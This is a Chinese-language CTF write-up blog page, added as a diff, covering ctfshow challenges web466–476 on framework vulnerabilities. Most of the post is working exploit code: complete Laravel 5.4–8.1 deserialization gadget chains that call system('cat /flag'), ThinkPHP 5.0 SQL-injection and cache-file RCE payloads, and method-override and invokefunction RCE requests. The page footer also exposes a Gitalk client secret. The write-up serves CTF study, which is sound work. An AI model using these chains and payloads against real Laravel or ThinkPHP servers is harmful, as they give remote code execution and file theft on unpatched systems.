@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>[ctfshow]框架复现 | fallingskies</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://fallingskies22.github.io/favicon.ico?v=1724150366542">
+<link rel="stylesheet" href="https://fallingskies22.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="web466
+Laravel5.4反序列化
+Laravel相关知识：
+添加路由在/routes/web.php
+添加控制器在/app/Http/Controlers/
+题目在路由处添加了反序列化入口
+&lt;?php
+
+/*
+|------..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://fallingskies22.github.io">
+        <img src="https://fallingskies22.github.io/images/avatar.png?v=1724150366542" class="site-logo">
+        <h1 class="site-title">fallingskies</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/post/friends" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      <h3>想要去月球<h3>
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://fallingskies22.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">[ctfshow]框架复现</h2>
+            <div class="post-date">2024-07-12</div>
+            
+              <div class="feature-container" style="background-image: url('https://fallingskies22.github.io/post-images/ctfshowkuang-jia-fu-xian.jpg')">
+              </div>
+            
+            <div class="post-content" v-pre>
+              <h2 id="web466">web466</h2>
+<p>Laravel5.4反序列化</p>
+<p>Laravel相关知识：<br>
+添加路由在/routes/web.php<br>
+添加控制器在/app/Http/Controlers/</p>
+<p>题目在路由处添加了反序列化入口</p>
+<pre><code class="language-php">&lt;?php
+
+/*
+|--------------------------------------------------------------------------
+| Web Routes
+|--------------------------------------------------------------------------
+|
+| Here is where you can register web routes for your application. These
+| routes are loaded by the RouteServiceProvider within a group which
+| contains the &quot;web&quot; middleware group. Now create something great!
+|
+*/
+
+Route::get('/', function () {
+    return view('welcome');
+});
+Route::get('admin/{obj}',function($s){
+	if($s){
+		unserialize(base64_decode($s));
+		return 'unserialize done'.$s;
+	}else{
+		return 'unserialize error'.$s;
+	}
+});
+</code></pre>
+<p>利用已知的反序列化链</p>
+<pre><code class="language-php">&lt;?php
+namespace Mockery\Generator {
+    class MockConfiguration {
+        protected $name = 'fallingskies';
+    }
+    class MockDefinition {
+        protected $config;
+        protected $code;
+        public function __construct() {
+            $this-&gt;config = new MockConfiguration();
+            $this-&gt;code = &quot;&lt;?php system('cat /flag');?&gt;&quot;;
+        }
+    }
+}
+
+namespace Mockery\Loader {
+    class EvalLoader {}
+}
+
+namespace Illuminate\Bus {
+    use Mockery\Loader\EvalLoader;
+    class Dispatcher {
+        protected $queueResolver;
+        public function __construct() {
+            $this-&gt;queueResolver = [new EvalLoader(), 'load'];
+        }
+    }
+}
+
+namespace Illuminate\Broadcasting {
+    use Illuminate\Bus\Dispatcher;
+    use Mockery\Generator\MockDefinition;
+    class BroadcastEvent {
+        public $connection;
+        public function __construct() {
+            $this-&gt;connection = new MockDefinition();
+        }
+    }
+    class PendingBroadcast {
+        protected $events;
+        protected $event;
+        public function __construct() {
+            $this-&gt;events = new Dispatcher();
+            $this-&gt;event = new BroadcastEvent();
+        }
+    }
+    echo base64_encode(serialize(new PendingBroadcast()));
+}
+?&gt;
+</code></pre>
+<p>如果生产payload罕有<code>/</code>，需要进行url编码，这里需要进行两次编码<code>%252f</code></p>
+<h2 id="web467">web467</h2>
+<p>Laravel5.5反序列化</p>
+<p>上题链被拦截，过滤了一堆关键字。</p>
+<pre><code class="language-php">&lt;?php
+
+/*
+|--------------------------------------------------------------------------
+| Web Routes
+|--------------------------------------------------------------------------
+|
+| Here is where you can register web routes for your application. These
+| routes are loaded by the RouteServiceProvider within a group which
+| contains the &quot;web&quot; middleware group. Now create something great!
+|
+*/
+
+Route::get('/', function () {
+    return view('welcome');
+});
+Route::get('admin/{obj}',function($s){
+	if(preg_match('/defaultChannel|Validation|Bus|messages|CallQueuedClosure/i', base64_decode($s))){
+		die('other way');
+	}
+	if($s){
+		unserialize(base64_decode($s));
+		return 'unserialize done'.$s;
+	}else{
+		return 'unserialize error'.$s;
+	}
+});
+</code></pre>
+<p>换一条链就行了</p>
+<pre><code class="language-php">&lt;?php
+namespace Illuminate\Broadcasting
+{
+    use  Illuminate\Events\Dispatcher;
+    class PendingBroadcast
+    {
+        protected $events;
+        protected $event;
+        public function __construct($cmd)
+        {
+            $this-&gt;events = new Dispatcher($cmd);
+            $this-&gt;event=$cmd;
+        }
+    }
+    echo base64_encode(serialize(new PendingBroadcast('cat /flag')));
+}
+
+
+namespace Illuminate\Events
+{
+    class Dispatcher
+    {
+        protected $listeners;
+        public function __construct($event){
+            $this-&gt;listeners=[$event=&gt;['system']];
+        }
+    }
+}
+</code></pre>
+<h2 id="web468">web468</h2>
+<p>更改了过滤内容</p>
+<pre><code class="language-php">&lt;?php
+
+/*
+|--------------------------------------------------------------------------
+| Web Routes
+|--------------------------------------------------------------------------
+|
+| Here is where you can register web routes for your application. These
+| routes are loaded by the RouteServiceProvider within a group which
+| contains the &quot;web&quot; middleware group. Now create something great!
+|
+*/
+
+Route::get('/', function () {
+    return view('welcome');
+});
+Route::get('admin/{obj}',function($s){
+	if(preg_match('/listeners|Validation|Bus|messages|CallQueuedClosure/i', base64_decode($s))){
+		die('other way');
+	}
+	if($s){
+		unserialize(base64_decode($s));
+		return 'unserialize done'.$s;
+	}else{
+		return 'unserialize error'.$s;
+	}
+});
+</code></pre>
+<p>使用其他链</p>
+<pre><code class="language-php">&lt;?php
+namespace Illuminate\Notifications {
+    class ChannelManager {
+        protected $app;
+        protected $customCreators;
+        protected $defaultChannel;
+        public function __construct() {
+            $this-&gt;app = 'cat /flag';
+            $this-&gt;defaultChannel = 'fallingskies';
+            $this-&gt;customCreators = ['fallingskies' =&gt; 'system'];
+        }
+    }
+}
+
+
+namespace Illuminate\Broadcasting {
+    use  Illuminate\Notifications\ChannelManager;
+    class PendingBroadcast {
+        protected $events;
+        public function __construct()
+        {
+            $this-&gt;events = new ChannelManager();
+        }
+    }
+    echo base64_encode(serialize(new PendingBroadcast()));
+}
+?&gt;
+</code></pre>
+<h2 id="web469">web469</h2>
+<pre><code class="language-php">&lt;?php
+
+/*
+|--------------------------------------------------------------------------
+| Web Routes
+|--------------------------------------------------------------------------
+|
+| Here is where you can register web routes for your application. These
+| routes are loaded by the RouteServiceProvider within a group which
+| contains the &quot;web&quot; middleware group. Now create something great!
+|
+*/
+
+Route::get('/', function () {
+    return view('welcome');
+});
+Route::get('admin/{obj}',function($s){
+	if(preg_match('/defaultChannel|listeners|Bus|messages|CallQueuedClosure/i', base64_decode($s))){
+		die('other way');
+	}
+	if($s){
+		unserialize(base64_decode($s));
+		return 'unserialize done'.$s;
+	}else{
+		return 'unserialize error'.$s;
+	}
+});
+</code></pre>
+<pre><code class="language-php">&lt;?php
+namespace Illuminate\Broadcasting
+{
+    use Faker\ValidGenerator;
+    class PendingBroadcast
+    {
+        protected $events;
+        public function __construct($cmd)
+        {
+            $this-&gt;events = new ValidGenerator($cmd);
+        }
+    }
+    $seri = new PendingBroadcast('cat /flag');
+    echo base64_encode(serialize($seri));
+}
+
+namespace Faker
+{
+    use Faker\DefaultGenerator;
+    class ValidGenerator
+    {
+        protected $maxRetries;
+        protected $validator;
+        protected $generator;
+        public function __construct($cmd)
+        {
+            $this-&gt;generator = new DefaultGenerator($cmd);
+            $this-&gt;maxRetries = 10000000;
+            $this-&gt;validator = 'system';
+        }
+
+    }
+}
+
+namespace Faker
+{
+    class DefaultGenerator
+    {
+        protected $default;
+        public function __construct($cmd)
+        {
+            $this-&gt;default = $cmd;
+        }
+    }
+}
+?&gt;
+</code></pre>
+<h2 id="web470">web470</h2>
+<pre><code class="language-php">&lt;?php
+
+/*
+|--------------------------------------------------------------------------
+| Web Routes
+|--------------------------------------------------------------------------
+|
+| Here is where you can register web routes for your application. These
+| routes are loaded by the RouteServiceProvider within a group which
+| contains the &quot;web&quot; middleware group. Now create something great!
+|
+*/
+
+Route::get('/', function () {
+    return view('welcome');
+});
+Route::get('admin/{obj}',function($s){
+	if(preg_match('/defaultChannel|Validation|listeners|CallQueuedClosure/i', base64_decode($s))){
+		die('other way');
+	}
+	if($s){
+		unserialize(base64_decode($s));
+		return 'unserialize done'.$s;
+	}else{
+		return 'unserialize error'.$s;
+	}
+});
+</code></pre>
+<p>使用上题链</p>
+<h2 id="web471">web471</h2>
+<p>laravel5.8 反序列化</p>
+<p>使用上题链依然可以。</p>
+<h2 id="web472">web472</h2>
+<p>laravel 8.1 反序列化</p>
+<p>使用上题链依然可以。</p>
+<h2 id="web473">web473</h2>
+<p>参考文章<a href="https://www.cnblogs.com/litlife/p/11273652.html">Thinkphp 5.0.15 设计缺陷导致Insert/update-SQL注入 分析</a><br>
+详细分析文章<a href="https://xz.aliyun.com/t/9124">thinkphp5.0 SQL注入详细分析</a></p>
+<p>thinkphp5.0.15默认控制器的部分代码，使用默认路由：</p>
+<pre><code class="language-php">&lt;?php
+public function inject(){
+     $a=request()-&gt;get('a/a');
+     db('users')-&gt;insert(['username'=&gt;$a]);
+     return 'done';
+    }
+</code></pre>
+<p>payload</p>
+<pre><code>/?s=index/index/inject&amp;a[0]=inc&amp;a[1]=exp(~(select%20load_file(%27/flag%27)))&amp;a[2]=
+</code></pre>
+<p>这里使用updatexml不行，所以用的exp报错注入。</p>
+<h2 id="web474">web474</h2>
+<p>thinkphp5.0.5默认控制器的部分代码，使用默认路由：</p>
+<pre><code class="language-php">&lt;?php
+ public function rce(){
+        Cache::set(&quot;cache&quot;,input('get.cache'));
+        return 'done';
+    }
+</code></pre>
+<p>参考文章<a href="https://blog.csdn.net/rfrder/article/details/114599310">Thinkphp cache缓存函数远程代码执行漏洞</a></p>
+<p>缓存生成的路径和文件名是根据参数名的md5值计算的，这里是<code>cache</code>。</p>
+<pre><code>?s=index/index/rce&amp;cache=%0d%0asystem(%27cat%20/flag%27);//
+缓存路径： runtime/cache/0f/ea6a13c52b4d4725368f24b045ca84.php
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://fallingskies22.github.io/post-images/1720946996173.png" alt="" loading="lazy"></figure>
+<p>参考修复内容，原本使用了<code>//</code>来防止缓存文件解析，但可以使用换行符来绕过，修复时使用exit头来禁止解析缓存内容。</p>
+<h2 id="web475">web475</h2>
+<p>参考文章<a href="https://blog.csdn.net/weixin_43610673/article/details/128757142">thinkphp5 method任意调用方法导致rce</a></p>
+<p>使用POST形式传参</p>
+<pre><code>_method=__construct&amp;method=GET&amp;filter[]=system&amp;get[]=cat /flag
+</code></pre>
+<h2 id="web476">web476</h2>
+<p>参考之前的文章Thinkphp5未开启强制路由RCE</p>
+<pre><code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag
+</code></pre>
+<h2 id="参考文章">参考文章</h2>
+<p>https://www.anquanke.com/post/id/258264</p>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://fallingskies22.github.io/post/ctfshowqian-ru-shi/">
+                  <h3 class="post-title">
+                    [ctfshow]嵌入式
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: '1b08861b8ad19018640e',
+        clientSecret: '1881a7245597aa70e1ffc8412e5b6c1eb0ad7241',
+        repo: 'fallingskies22.github.io',
+        owner: 'fallingskies22',
+        admin: ['fallingskies22'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
